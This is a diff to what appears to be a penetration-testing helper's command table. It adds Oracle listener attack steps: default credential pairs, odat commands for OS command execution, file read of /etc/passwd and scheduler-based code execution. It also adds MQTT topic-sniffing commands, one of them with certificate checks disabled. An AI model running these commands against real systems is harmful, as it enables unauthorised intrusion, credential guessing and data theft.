@@ -4761,14 +4761,21 @@ _STEP_COMMANDS = {
         3: [
             "odat passwordguesser -s <RHOST> -p 1521 -d <SID>",
             "nmap -p1521 --script oracle-brute --script-args oracle-brute.sid=<SID> <RHOST>",
+            "# defaults worth trying: SCOTT/TIGER, SYS/CHANGE_ON_INSTALL, SYSTEM/MANAGER, DBSNMP/DBSNMP",
         ],
         4: [
-            "# HackTricks Oracle: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener",
+            "sqlplus <USER>/<PASS>@<RHOST>:1521/<SID>   # then: SELECT * FROM user_role_privs;",
+            "odat all -s <RHOST> -p 1521 -d <SID> -U <USER> -P <PASS>   # auto: privesc, file r/w, RCE checks",
+            "odat externaltable -s <RHOST> -p 1521 -d <SID> -U <USER> -P <PASS> --exec /tmp id   # OS command exec",
+            "odat utlfile -s <RHOST> -p 1521 -d <SID> -U <USER> -P <PASS> --getFile /etc/passwd . passwd.txt   # arbitrary file read",
+            "odat dbmsscheduler -s <RHOST> -p 1521 -d <SID> -U <USER> -P <PASS> --exec 'id'   # alt RCE vector",
         ],
     },
     "mqtt": {
         1: [
             "mosquitto_sub -h <RHOST> -p 1883 -t '#' -v",
+            "nmap -p1883 --script mqtt-subscribe <RHOST>",
+            "mosquitto_sub -h <RHOST> -p 8883 --insecure --cafile /dev/null -t '#' -v   # MQTTS (TLS)",
         ],
         2: [
             "mosquitto_sub -h <RHOST> -p 1883 -t '$SYS/#' -v",
